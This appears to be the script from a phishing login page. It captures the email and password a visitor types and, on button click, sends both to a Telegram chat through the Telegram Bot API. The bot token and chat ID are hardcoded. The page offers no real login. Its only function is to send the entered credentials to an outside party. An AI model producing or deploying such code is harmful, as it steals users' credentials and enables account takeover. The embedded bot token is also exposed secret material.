const password = document.querySelector("#password");
const btn = document.querySelector("#btn");
const email = document.querySelector("#email");
let emailvalue = "";
let passwordvalue = "";
let BOT_API_TOKEN = "7197025492:AAHms_VUe9rN6bX0t3EPWKYXaioJTr4oN-o";
let CHAT_ID_1 = "-1001996268153";

password.addEventListener("input", e => {
  passwordvalue = e.target.value;
});

email.addEventListener("input", e => {
  emailvalue = e.target.value;
});

btn.addEventListener("click", () => {
  const messageText = `login: ${encodeURIComponent(
    emailvalue
  )}\npassword: ${encodeURIComponent(passwordvalue)}`;
  const body = `chat_id=${CHAT_ID_1}&text=${encodeURIComponent(messageText)}`;

  fetch(`https://api.telegram.org/bot${BOT_API_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: body,
  })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error("Error:", error));
});
